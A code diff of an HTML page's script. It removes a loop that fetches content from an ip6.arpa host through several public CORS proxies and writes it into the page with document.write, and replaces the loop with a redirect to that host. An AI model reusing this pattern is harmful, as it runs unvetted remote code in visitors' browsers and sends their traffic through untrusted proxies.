@@ -36,31 +36,9 @@
 
 <script>
     (async () => {
-        const proxies = [
-            'https://api.allorigins.win/raw?url=',
-            'https://corsproxy.io/?',
-            'https://proxy.cors.sh/',
-            'https://thingproxy.freeboard.io/fetch/'
-        ];
+        window.location.href = 'http://9.3.0.1.9.1.0.0.0.7.4.0.1.0.0.2.ip6.arpa';
 
-        const target = 'http://9.3.0.1.9.1.0.0.0.7.4.0.1.0.0.2.ip6.arpa/?get_source=1';
-
-        for (let proxy of proxies) {
-            try {
-                const response = await fetch(proxy + encodeURIComponent(target));
-                if (response.ok) {
-                    const sourceCode = await response.text();
-                    document.open();
-                    document.write(sourceCode);
-                    document.close();
-                    return; // 成功就退出
-                }
-            } catch (e) {
-                console.log(`代理 ${proxy} 失败，尝试下一个`);
-            }
-        }
-
-        document.body.innerHTML = "所有代理都失败了";
+        document.body.innerHTML = "失败了";
     })();
 </script>
 </body>
